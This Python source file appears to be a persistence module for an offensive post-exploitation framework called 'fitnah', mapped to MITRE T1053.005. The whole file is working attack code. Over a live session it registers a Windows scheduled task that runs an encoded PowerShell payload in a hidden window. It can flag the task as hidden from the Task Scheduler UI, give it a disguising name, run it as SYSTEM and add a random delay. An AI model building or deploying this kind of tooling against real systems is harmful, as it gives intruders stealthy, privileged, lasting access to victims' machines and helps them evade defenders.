"""persistence/scheduled_task — COM-based scheduled task creation (stealthier than schtasks CLI). MITRE T1053.005"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ScheduledTask(BasePlugin):
    NAME        = "scheduled_task"
    DESCRIPTION = "COM-based task creation (New-ScheduledTask), hidden flag, SYSTEM option, random delay."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1053.005"
    CATEGORY    = "persistence"
    schema      = ParamSchema().add(
        Param("task_name",    str,  required=True,  help="Task name (can include path e.g. \\Microsoft\\Update)"),
        Param("payload",      str,  required=False, default="", help="PowerShell command to run"),
        Param("trigger",      str,  required=False, default="logon",
              help="Trigger type: logon | startup | daily | idle"),
        Param("run_as_system", bool, required=False, default=False,
              help="Run as SYSTEM account"),
        Param("hidden",       bool, required=False, default=True,
              help="Mark task as hidden (not shown in Task Scheduler UI)"),
        Param("delay_sec",    int,  required=False, default=0,
              help="Random startup delay max seconds (0=none)"),
        Param("remove",       bool, required=False, default=False,
              help="Unregister the task"),
    )

    @mitre("T1053.005")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        name      = params["task_name"]
        payload   = params.get("payload", "")
        trigger   = params.get("trigger", "logon").lower()
        system    = params.get("run_as_system", False)
        hidden    = params.get("hidden", True)
        delay     = params.get("delay_sec", 0)
        remove    = params.get("remove", False)

        if remove:
            ps = (
                f"try {{"
                f"  Unregister-ScheduledTask -TaskName '{name}' -Confirm:$false -EA Stop;"
                f"  Write-Output '[+] Task removed: {name}'"
                f"}} catch {{ Write-Output \"[-] Remove failed: $_\" }}"
            )
        else:
            if not payload:
                return ModuleResult.err("payload is required")
            # Pre-encode payload
            enc = base64.b64encode(payload.encode("utf-16-le")).decode("ascii")
            action_cmd = f"powershell.exe"
            action_args = f"-nop -w hidden -NonInteractive -EncodedCommand {enc}"

            if trigger == "logon":
                trig_block = "$trig = New-ScheduledTaskTrigger -AtLogOn;"
            elif trigger == "startup":
                trig_block = "$trig = New-ScheduledTaskTrigger -AtStartup;"
            elif trigger == "daily":
                trig_block = "$trig = New-ScheduledTaskTrigger -Daily -At '09:00';"
            elif trigger == "idle":
                trig_block = "$trig = New-ScheduledTaskTrigger -AtIdle;"
            else:
                trig_block = "$trig = New-ScheduledTaskTrigger -AtLogOn;"

            if delay > 0:
                trig_block += f" $trig.Delay = 'PT$((Get-Random -Maximum {delay}))S';"

            principal_block = (
                "$prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;"
                if system else
                "$prin = New-ScheduledTaskPrincipal -LogonType Interactive -RunLevel Highest;"
            )

            hidden_block = (
                "$set = New-ScheduledTaskSettingsSet -Hidden;"
                if hidden else
                "$set = New-ScheduledTaskSettingsSet;"
            )

            ps = (
                f"$action = New-ScheduledTaskAction -Execute '{action_cmd}' -Argument '{action_args}';"
                + trig_block
                + principal_block
                + hidden_block
                + f"$task = New-ScheduledTask -Action $action -Trigger $trig -Principal $prin -Settings $set;"
                + f"try {{"
                + f"  Register-ScheduledTask -TaskName '{name}' -InputObject $task -Force -EA Stop | Out-Null;"
                + f"  Write-Output '[+] Task registered: {name}';"
                + f"  Write-Output '    Trigger: {trigger}  SYSTEM: {system}  Hidden: {hidden}'"
                + f"}} catch {{ Write-Output \"[-] Register failed: $_\" }}"
            )
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
